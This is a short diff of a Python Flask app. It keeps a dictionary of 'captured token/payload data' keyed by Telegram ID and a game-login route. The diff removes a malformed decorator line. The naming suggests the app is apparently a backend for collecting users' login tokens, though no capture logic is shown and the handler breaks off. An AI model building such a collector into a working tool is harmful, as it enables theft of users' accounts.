@@ -6,11 +6,6 @@ app = Flask(__name__)
 # Key: telegram_id, Value: captured token/payload data
 TOKEN_DATABASE = {}
 
-
-@app.route("/<telegram_id>/", methods=["GET", "POST"])
-with_login_capture = lambda: None  # Just structure alignment
-
-
 @app.route("/<telegram_id>/", methods=["GET", "POST", "PUT"])
 def handle_game_login(telegram_id):
   try:
